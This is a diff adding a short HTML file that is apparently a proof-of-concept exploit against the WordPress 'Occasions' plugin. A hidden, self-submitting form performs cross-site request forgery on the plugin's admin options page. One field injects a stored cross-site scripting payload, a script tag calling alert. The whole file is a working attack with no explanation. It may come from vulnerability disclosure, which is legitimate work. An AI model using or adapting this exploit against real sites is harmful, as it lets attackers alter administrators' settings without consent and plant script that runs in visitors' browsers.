@@ -1,0 +1,17 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CSRF Occasions&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- www.example.com:9001/wordpress --&gt;
+    &lt;form action=&quot;http://127.0.0.1:9001/wordpress/wp-admin/options-general.php?page=occasions/occasions.php&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;saveoccasions&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;nodes[]&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;occ_title1&quot; value=&quot;CSRF Vulnerability&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;occ_startdate1&quot; value=&quot;18.03.&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;occ_enddate1&quot; value=&quot;28.03.&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;occ_type1&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;occ_content1&quot; value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; /&gt;
+        &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
